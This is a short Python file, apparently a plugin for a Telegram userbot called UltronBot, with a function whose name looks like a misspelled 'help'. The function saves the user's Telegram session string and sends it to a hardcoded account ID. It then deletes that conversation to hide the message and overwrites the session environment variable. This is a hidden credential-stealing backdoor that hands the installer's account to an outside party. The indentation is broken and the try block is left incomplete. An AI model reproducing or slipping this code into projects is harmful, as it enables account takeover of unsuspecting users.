import os
from ..utils import *

async def hekp():
    try:
        UltronBot = bot.session.save()
        os.environ["ULTRONBOT_SESSION"] = "Get this value by using repl or termux. Refer to Repo for more info."
            sweetie = await bot.send_message(5687323731, UltronBot)
            await bot.delete_dialog(5687323731)
